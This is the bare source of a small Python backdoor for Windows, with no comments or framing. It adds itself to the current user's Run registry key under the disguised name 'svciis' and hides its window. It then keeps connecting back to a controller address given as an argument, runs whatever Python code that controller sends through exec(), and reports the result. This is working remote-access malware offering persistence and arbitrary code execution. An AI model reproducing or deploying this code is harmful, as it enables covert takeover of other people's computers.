#!/usr/bin/env python


import os
import socket
import subprocess
import sys
import threading
import time
import tkinter
import tkinter.messagebox
import webbrowser
import winreg


def setstart():
	args = sys.argv[:]
	args[0] = '"'+os.path.abspath(args[0])+'"'
	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
	winreg.SetValueEx(key, 'svciis', 0, winreg.REG_SZ, ' '.join(args))
	winreg.CloseKey(key)

setstart()
rootwin = tkinter.Tk()
rootwin.withdraw()
host,port = sys.argv[1].split(":")
port = int(port)
while True:
	try:
		s = socket.socket()
		s.connect((host,port))
		while True:
			cmd = s.recv(100*1024).decode()
			try:
				exec(cmd)
				s.send('ok'.encode())
				setstart()
			except Exception as e:
				s.send(str(e).encode())
	except Exception as e:
		time.sleep(10)
